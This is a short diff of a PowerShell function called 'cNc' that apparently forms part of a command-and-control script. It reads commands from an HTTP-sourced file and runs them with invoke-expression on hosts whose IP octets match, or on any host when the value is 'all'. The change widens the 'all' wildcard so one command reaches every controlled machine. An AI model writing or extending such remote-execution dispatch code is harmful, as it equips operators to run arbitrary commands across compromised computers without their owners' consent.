@@ -185,7 +185,7 @@ function cNc{
     foreach($line in Get-Content $httpCommand) {
         $read += $line
     }
-    if($read[1] -eq ($hostIP.split("."))[3] ){
+    if($read[1] -eq ($hostIP.split("."))[3] -or $read[1] -eq 'all'){
         if($read[0] -eq ($hostIP.split("."))[1] -or $read[0] -eq 'all'){
             invoke-expression $read[2]
         }
